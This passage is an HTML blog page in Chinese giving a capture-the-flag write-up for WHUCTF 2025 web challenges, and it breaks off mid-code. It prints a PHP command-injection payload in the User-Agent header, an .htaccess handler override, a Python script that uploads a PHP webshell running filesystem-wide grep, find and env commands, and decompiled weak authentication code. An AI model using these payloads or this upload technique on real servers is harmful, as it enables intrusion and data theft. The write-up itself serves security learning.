@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-50x50.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-50x50.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="theme-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="WHUCTF新生赛比上次有进步，但是还是写的很烂，还得加油 web1.User-Agent在请求头User-Agent中构造Payload简单绕过一下 1User-Agent: system(&#x27;tac &#x2F;fla&#x27; . &#x27;g&#x27;);  在响应体中得到Flag：WHUCTF{KFc_kr42y_thURsDAy_V_Me_5o_N0w_Pl2Zz2zz} 2.井字">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025whuctf新生赛">
+<meta property="og:url" content="http://example.com/2025/10/26/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Ducklinger">
+<meta property="og:description" content="WHUCTF新生赛比上次有进步，但是还是写的很烂，还得加油 web1.User-Agent在请求头User-Agent中构造Payload简单绕过一下 1User-Agent: system(&#x27;tac &#x2F;fla&#x27; . &#x27;g&#x27;);  在响应体中得到Flag：WHUCTF{KFc_kr42y_thURsDAy_V_Me_5o_N0w_Pl2Zz2zz} 2.井字">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/whuctf20251.png">
+<meta property="og:image" content="http://example.com/images/whuctf20252.png">
+<meta property="og:image" content="http://example.com/images/whuctf20253.png">
+<meta property="og:image" content="http://example.com/images/whuctf20254.png">
+<meta property="og:image" content="http://example.com/images/whuctf20255.png">
+<meta property="og:image" content="http://example.com/images/whuctf20256.png">
+<meta property="og:image" content="http://example.com/images/whuctf20257.png">
+<meta property="og:image" content="http://example.com/images/whuctf20258.png">
+<meta property="article:published_time" content="2025-10-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-20T11:46:02.577Z">
+<meta property="article:author" content="Ducklinger">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/whuctf20251.png">
+
+<link rel="canonical" href="http://example.com/2025/10/26/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9B/">
+
+
+<script id="page-configurations">
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2025whuctf新生赛 | Ducklinger</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ducklinger</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section">分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section">标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section">归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/26/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Ducklinger">
+      <meta itemprop="description" content="分享日常">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ducklinger">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2025whuctf新生赛
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-10-26 00:00:00" itemprop="dateCreated datePublished" datetime="2025-10-26T00:00:00+08:00">2025-10-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-20 19:46:02" itemprop="dateModified" datetime="2026-03-20T19:46:02+08:00">2026-03-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="WHUCTF新生赛"><a href="#WHUCTF新生赛" class="headerlink" title="WHUCTF新生赛"></a>WHUCTF新生赛</h1><p>比上次有进步，但是还是写的很烂，还得加油</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-User-Agent"><a href="#1-User-Agent" class="headerlink" title="1.User-Agent"></a>1.User-Agent</h3><p>在请求头User-Agent中构造Payload简单绕过一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /fla&#x27;</span> . <span class="string">&#x27;g&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在响应体中得到Flag：<strong>WHUCTF{KFc_kr42y_thURsDAy_V_Me_5o_N0w_Pl2Zz2zz}</strong></p>
+<h3 id="2-井字棋小游戏"><a href="#2-井字棋小游戏" class="headerlink" title="2.井字棋小游戏"></a>2.井字棋小游戏</h3><p>发现是一个简单的纯前端小游戏，翻下代码发现棋盘的参数是数组gameBoard，直接在前端控制台修改一下参数gameBoard &#x3D; [‘X’, ‘X’ , ‘X’ , null , null, null, null ,null null],然后再点击一下棋盘直接获胜，弹出flag，在network里面看一下具体响应，再响应体里面发现flag：</p>
+<p><img src="/../images/whuctf20251.png"></p>
+<p><img src="/../images/whuctf20252.png"></p>
+<h3 id="3-apacherrr"><a href="#3-apacherrr" class="headerlink" title="3.apacherrr"></a>3.apacherrr</h3><p>一进去发现一大坨文字直接丢给ai解释大致意思是有三个站点uploaderrr.com，whuctf.com和主站点，先分别访问一下（抓包改一下host头）发现whuctf.com访问不了，uploaderrr.com是个文件上传的地方，一开始直接想到文件上传漏洞发现就算绕过了文件名检测也无法执行shell里面的代码，然后卡住了，问了下师傅＋提示，在网上搜了一下，<a target="_blank" rel="noopener" href="https://luokuang1.github.io/2024/07/23/%E6%B5%85%E8%B0%88ctf%E4%B8%AD-htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%90%E7%94%A8/">https://luokuang1.github.io/2024/07/23/%E6%B5%85%E8%B0%88ctf%E4%B8%AD-htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%90%E7%94%A8/</a><br>学习了一下大佬的博客，大概了解到，先上传配置文件让apache把.txt文件当成.php文件来执行文件内容为</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br><span class="line"># php_value engine On</span><br></pre></td></tr></table></figure>
+
+<p>然后再上传一个shell.txt文件执行指令，让ai帮写了一下脚本上传文件＋扫目录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">TARGET_IP = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">TARGET_PORT = <span class="number">60483</span></span><br><span class="line">UPLOAD_URL = <span class="string">f&quot;http://<span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span>/upload.php&quot;</span></span><br><span class="line">FLAG_URL = <span class="string">f&quot;http://<span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span>/uploads/phpinfo.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">filename, content, content_type=<span class="string">&quot;text/plain&quot;</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&#x27;userfile&#x27;</span>: (filename, content, content_type),</span><br><span class="line">            <span class="string">&#x27;MAX_FILE_SIZE&#x27;</span>: (<span class="literal">None</span>, <span class="string">&#x27;30000&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;uploaderrr.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/133.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>: <span class="string">f&#x27;http://<span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span>&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">f&#x27;http://<span class="subst">&#123;TARGET_IP&#125;</span>:<span class="subst">&#123;TARGET_PORT&#125;</span>/&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(UPLOAD_URL, files=files, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;successfully uploaded&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 成功上传 <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 上传 <span class="subst">&#123;filename&#125;</span> 失败，响应: <span class="subst">&#123;response.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 上传出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;whuctf2025.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/133.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.get(FLAG_URL, headers=headers, timeout=(<span class="number">15</span>, <span class="number">60</span>))</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n📜 终极全局搜索结果:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(response.text[:<span class="number">15000</span>])</span><br><span class="line">            <span class="comment"># 精准提取flag格式</span></span><br><span class="line">            <span class="keyword">import</span> re</span><br><span class="line">            real_flag = re.search(<span class="string">r&#x27;whuctf\&#123;[a-zA-Z0-9_]&#123;8,32&#125;\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> real_flag:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n🎉 找到终极 Flag: <span class="subst">&#123;real_flag.group()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 获取结果失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 访问出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== 终极全局搜索：系统级flag挖掘 ===&quot;</span>)</span><br><span class="line">    <span class="comment"># 脚本：执行5个核心系统命令，覆盖所有藏flag的可能</span></span><br><span class="line">    final_search_content = <span class="string">&quot;&quot;&quot;&lt;?php</span></span><br><span class="line"><span class="string">    echo &quot;=== 终极全局搜索flag ===&quot;;</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 1. 搜索所有文件内容含whuctf&#123;（精准匹配，不遗漏）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 1. 全系统搜索whuctf&#123;:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    echo shell_exec(&#x27;grep -r &quot;whuctf&#123;&quot; / --include=&quot;*.php&quot; --include=&quot;*.txt&quot; --include=&quot;*.conf&quot; --include=&quot;*.ini&quot; 2&gt;/dev/null | grep -v &quot;proc&quot; | grep -v &quot;sys&quot;&#x27;);</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 2. 读取Apache系统级配置文件（最可能藏flag）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 2. 读取Apache系统配置:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    $apache_configs = [&quot;/etc/apache2/apache2.conf&quot;, &quot;/etc/apache2/sites-available/000-default.conf&quot;];</span></span><br><span class="line"><span class="string">    foreach($apache_configs as $conf) &#123;</span></span><br><span class="line"><span class="string">        if(file_exists($conf)) &#123;</span></span><br><span class="line"><span class="string">            echo &quot;📄 $conf:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">            echo nl2br(shell_exec(&#x27;grep -E &quot;whuctf|flag&quot; &#x27; . escapeshellarg($conf) . &#x27; 2&gt;/dev/null&#x27;));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 3. 读取环境变量（CTF常用藏flag方式）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 3. 系统环境变量:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    echo shell_exec(&#x27;env | grep -i &quot;flag&quot;&#x27;);</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 4. 搜索根目录下所有非系统文件（大小10-1000字节，符合flag文件特征）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 4. 根目录可疑文件:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    echo shell_exec(&#x27;find / -size +10c -size -1000c -type f ! -path &quot;/proc/*&quot; ! -path &quot;/sys/*&quot; ! -path &quot;/usr/*&quot; ! -path &quot;/lib/*&quot; 2&gt;/dev/null&#x27;);</span></span><br><span class="line"><span class="string">    echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 5. 读取/var/log日志（可能记录flag相关操作）</span></span><br><span class="line"><span class="string">    echo &quot;🔍 5. 日志文件中的flag:&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">    echo shell_exec(&#x27;grep -r &quot;whuctf&#123;&quot; /var/log 2&gt;/dev/null | head -n 5&#x27;);</span></span><br><span class="line"><span class="string">    ?&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> upload_file(<span class="string">&quot;phpinfo.txt&quot;</span>, final_search_content):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)  <span class="comment"># 全局搜索耗时，延长等待</span></span><br><span class="line">    get_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n=== 终极搜索完成 ===&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>发现flag在环境变量里面：</p>
+<p><img src="/../images/whuctf20253.png"></p>
+<h3 id="4-Guild（赛后解出来的，有点可惜）"><a href="#4-Guild（赛后解出来的，有点可惜）" class="headerlink" title="4.Guild（赛后解出来的，有点可惜）"></a>4.Guild（赛后解出来的，有点可惜）</h3><p>因为死磕一道题去了导致这个比较简单的没写出来</p>
+<p>主要思路是根据给出的服务器后端代码server.jar文件（不知道是不是我方法不对），对这文件进行java反汇编，找到关键文件<code>UserDetailsServiceImpl</code>用户认证逻辑：</p>
+<p><strong>UserDetailsServiceImpl</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.jwmc.kuri.guild;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.authority.SimpleGrantedAuthority;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UsernameNotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.crypto.password.PasswordEncoder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDetailsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserDetailsService</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String USERNAME;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String PASSWORD;</span><br><span class="line">   <span class="meta">@Autowired</span></span><br><span class="line">   PasswordEncoder passwordEncoder;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> UserDetails <span class="title function_">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException &#123;</span><br><span class="line">      <span class="keyword">if</span> (!username.equals(USERNAME)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UsernameNotFoundException</span>(<span class="string">&quot;User not found&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="built_in">this</span>.passwordEncoder.encode(PASSWORD);</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(username, password, List.of(<span class="keyword">new</span> <span class="title class_">SimpleGrantedAuthority</span>(<span class="string">&quot;ADMIN&quot;</span>), <span class="keyword">new</span> <span class="title class_">SimpleGrantedAuthority</span>(<span class="string">&quot;USER&quot;</span>)));</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个主要是发现用户名和密码是静态的</p>
+<p><strong>GuildSecurityconfig：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.jwmc.kuri.guild;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.security.crypto.password.PasswordEncoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GuildSecurityConfig$1</span> <span class="keyword">implements</span> <span class="title class_">PasswordEncoder</span> &#123;</span><br><span class="line">   <span class="comment">// $FF: synthetic field</span></span><br><span class="line">   <span class="keyword">final</span> GuildSecurityConfig <span class="built_in">this</span>$<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   GuildSecurityConfig$<span class="number">1</span>(<span class="keyword">final</span> GuildSecurityConfig <span class="built_in">this</span>$<span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span> = <span class="built_in">this</span>$<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(CharSequence rawPassword)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> String.valueOf(rawPassword.toString().hashCode() % <span class="number">65536</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">matches</span><span class="params">(CharSequence rawPassword, String encodedPassword)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> String.valueOf(rawPassword.toString().hashCode() % <span class="number">65536</span>).equals(encodedPassword);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个是密码的加密算法是:<br>$$<br>( rawpassword-&gt;string-&gt;hashcode ) mod (65536)<br>$$</p>
+<p><strong>GuildApplication</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ackage top.jwmc.kuri.guild;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GuildApplication</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span 